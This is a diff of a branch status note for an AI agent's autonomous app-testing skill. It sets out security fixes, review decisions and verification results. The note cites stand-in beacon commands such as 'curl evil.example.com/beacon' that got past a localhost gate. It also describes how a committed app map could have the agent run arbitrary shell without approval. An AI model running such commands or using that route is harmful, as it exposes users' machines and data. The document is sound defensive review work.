@@ -2,83 +2,71 @@
 
 **Status:** under evaluation. NOT merged to `main`, NOT part of any release.
 
-This branch carries @albertsanz's `/live-test` skill (#93 → #95) on top of `main`,
-plus security fixes. #96 adds a flow contract for the skill and depends on the
-flow-contracts ladder — it belongs on `experimental/flow-contracts` once both
-are accepted.
+This branch carries @albertsanz's **restacked** `/live-test` series (Aug 23),
+brought up to date with `main` (2026-09-23):
+
+| Part | PR | What |
+|---|---|---|
+| 1/4 | #93 | driving references: web (browser MCP), API (curl), CLI, recovery, first-run |
+| 2/4 | #94 | map-driven `preflight.sh` + app-map template |
+| 3/4 | #95 | skill entry, findings template, registration |
+| 4/4 | #96 | live-test's own flow contract (36 nodes) + generated view |
+
+**Part 4 depends on the flow-contracts main line (#79 → #88, without L5), so
+this branch contains that ladder too.** To take live-test without flow
+contracts, merge #95's tip (`d18fa71`) instead.
+
+The restack superseded the Aug 20 version of this branch. Both Aug 20 security
+fixes (the scheme-less URL bypass, predictable temp paths) are in Albert's
+commits with authorship kept. The Aug 20 history is still reachable as the
+first parent of the 2026-09-23 merge.
 
 ## What it adds
 
-An autonomous dynamic-testing skill: plans a scoped run (user-approved at a hard
-gate), drives the app's declared surface (web via browser MCP, HTTP API via curl,
-or CLI), verifies each scenario on multiple signals, optionally fixes critical
-bugs in a bounded loop, and writes append-only findings. Project facts live in a
-project-owned `docs/testing/APP_MAP.md`; `preflight.sh` gates execution on stack
-health.
+An autonomous dynamic-testing skill. It plans a scoped run behind a hard user
+gate, drives the app's declared surface, checks each scenario on several
+signals, optionally fixes critical bugs in a bounded loop, and writes findings.
+Project facts live in a project-owned `docs/testing/APP_MAP.md`.
+Nothing else in Exosuit drives a running app: `/manual-test` writes a plan,
+`/UAT-cycle` supervises a human, and `integration-tester` marks such ACs
+UNTESTABLE.
 
-**It fills a real gap.** `/manual-test` writes a plan and stops. `/UAT-cycle`
-supervises a human. `/testing-cycle` processes one feedback string.
-`/claude-sense-check` is code-only. The `integration-tester` agent flags
-un-runnable ACs as UNTESTABLE — literally naming this hole. Nothing else drives a
-running app. Browser control is MCP-only in Claude Code, so routing through
-Playwright MCP with a documented fallback integrates with the native path rather
-than reimplementing it.
+## What happened to the Aug 20 open decisions
 
-## Security fixes applied on this branch
+| # | Decision | Albert's restack |
+|---|---|---|
+| 1 | "Localhost is not safe" | **Required `data_environment: disposable \| shared`.** Preflight refuses to run without it; `shared` arms a MUTATION LOCK (read-only scenarios only). The first-run interview defaults to `shared` when unsure. |
+| 2 | App map runs shell before any gate | **Per-clone cmd approval.** Preflight prints every `cmd` verbatim, exits 3 having run nothing, and only `--approve-cmds <hash>` runs them. The approval is stored in gitignored `.claude/hooks/state/`, so it can't be committed for others, and it's invalidated when the map changes. |
+| 3 | Fix loop opt-out | **Opt-in `--fix`**; without it every Critical becomes a handoff. The plan gate states "Fix loop: authorized \| report-only". |
+| 4 | Credentials in findings | Mandatory redaction step before the findings commit plus a self-check grep. The `post-edit-format.sh` `.md` skip is still yours. |
+| 5 | No destructive-op guard on web/API | Web and API guides now carry the CLI guide's rule. |
+| 6 | MCP prompting | Playwright tools listed in `allowed-tools`, **excluding** `browser_evaluate` and `browser_run_code_unsafe`. |
+| 7 | "Starts the app" | Text now says preflight verifies a running stack and never launches it. The shared dev-launch snippet is still yours. |
+| 8 | Triplicated findings tables | Left for your refactor. |
 
-- **Scheme-less URL bypass closed.** The `cmd` localhost gate only inspected
-  words starting with `http(s)://`, but curl and wget default to `http://`, so
-  `curl evil.example.com/beacon` executed while `curl http://evil.example.com`
-  was refused. Verified closed; local checks still pass.
-- **Predictable temp paths replaced with `mktemp`** — `/tmp/live-test-body.json`
-  and `/tmp/lt-health.json` were symlink-clobberable and collided between
-  concurrent worktree runs.
-- **Secrets caveat documented** where response bodies are excerpted into findings.
-- `preflight.sh` mode `100644` → `100755`, matching every other skill script.
+Albert also found two defects in the Aug 20 gate fix and fixed both:
+- **False positives:** `pip install -r requirements.txt` and `git add .` were refused as URLs.
+- **Missed hosts:** dotless and decimal/hex hosts (`curl evilbox`, `curl 0xdeadbeef`) went through.
 
-## Open decisions — maintainer's call, NOT made here
+Bare-host scanning is now scoped to curl/wget. The URL check is framed as an
+accident-catcher; the cmd approval is the security boundary.
 
-These are design changes, not defects; each needs a product decision.
+## Remaining decisions (maintainer)
 
-1. **"Localhost" is not "safe".** Nothing asks what the app is *connected to*. A
-   dev server on `localhost:8000` can hold a shared-staging `DATABASE_URL`, a
-   live Stripe key, a real SMTP credential — while the skill is instructed to run
-   create/update/**delete** sequences and to repeat mutating requests to test
-   double-submit. Recommended: a required app-map field (e.g.
-   `data_environment: disposable|shared`) that preflight refuses to run without,
-   with `shared` blocking mutating scenarios. **This is the most important one.**
-2. **The app map executes arbitrary shell before any user gate.** `preflight.sh`
-   runs `sh -c` on every `cmd` line at step 0.3; the plan gate is at step 2, and
-   the prose tells the model "black box — run, don't read". `APP_MAP.md` is a
-   committed file, so cloning a repo and typing `/live-test` is arbitrary code
-   execution — with `Bash` auto-approved via `allowed-tools`. Verified by
-   execution. Recommended: print every `cmd` target verbatim and confirm once per
-   map-hash, or drop `cmd` in favour of `http`/`compose`.
-3. **The fix loop is opt-out, not opt-in.** It edits source and commits up to 3×
-   without a human gate; the plan gate approves *scenarios*, not fixes. A
-   misclassified local misconfiguration can leave spurious commits. Recommended:
-   make fixing `--fix` rather than `--no-fix`.
-4. **Evidence commits can leak credentials.** Findings are committed, the first
-   API scenario authenticates for real, and response bodies/screenshots are
-   excerpted — but `post-edit-format.sh`'s secrets scanner skips `.md`/`.txt`,
-   which are exactly live-test's output formats. Principle 13 has a blind spot
-   shaped like this skill.
-5. **No destructive-operation guard on web/API.** The CLI guide has a good one;
-   the API guide actively prescribes DELETE and the web guide is unguarded.
-6. **MCP tools cannot be auto-approved.** `allowed-tools` has no `mcp__*` entries
-   (this would be the repo's first), so a web run prompts on every browser call.
-7. **Nothing actually starts the app**, contrary to #92's headline — and the
-   "read `dev:`, run in background" block now exists in four places
-   (`build`, `sprint-end`, `story-cycle`, and here as prose). Extract a shared
-   prompt snippet.
-8. Findings-classification tables are triplicated across `/UAT-cycle`,
-   `/testing-cycle` and here — refactor target, not a blocker.
+1. Ship `/live-test`? If yes, with or without its flow contract (see above).
+2. `post-edit-format.sh` secrets scan skips `.md`/`.txt`, which are live-test's output formats.
+3. Extract the "read `dev:`, run in background" snippet shared with build/sprint-end/story-cycle.
 
-## Verification on this branch
+## Verification (2026-09-23, Linux, after merging main)
 
-- hook suite: 12 suites, **0 failures** (exit 0)
-- `validate-skills.sh`: 46 skills, 435 passed, **0 failures**; the one new
-  warning is live-test's 178-line SKILL.md over the 150-line budget (20 other
-  skills also exceed it)
-- localhost gate: 17 hostile URL spoofs all fail closed; scheme-less bypass
-  verified closed by execution
+- hook suite: **253 assertions, 0 failures** (exit 0)
+- `validate-flows.sh`: ALL CONFORMANT (8 contracts); `render-flow.sh --check`: current (8 flows)
+- `validate-skills.sh`: 46 skills, 438 passed, **0 failures** (new warning: live-test SKILL.md 203 lines > 150)
+- `shellcheck -S error`: clean, including `live-test/scripts/*.sh`
+- Gates exercised by execution against a scratch project:
+  - missing `data_environment`: exit 1, nothing run
+  - unapproved `cmd`: exit 3, nothing run, hash printed
+  - approved hash: runs
+  - map edited after approval: exit 3 again
+  - `curl evil.example.com/beacon`: refused even after approval
+  - `shared`: MUTATION LOCK printed
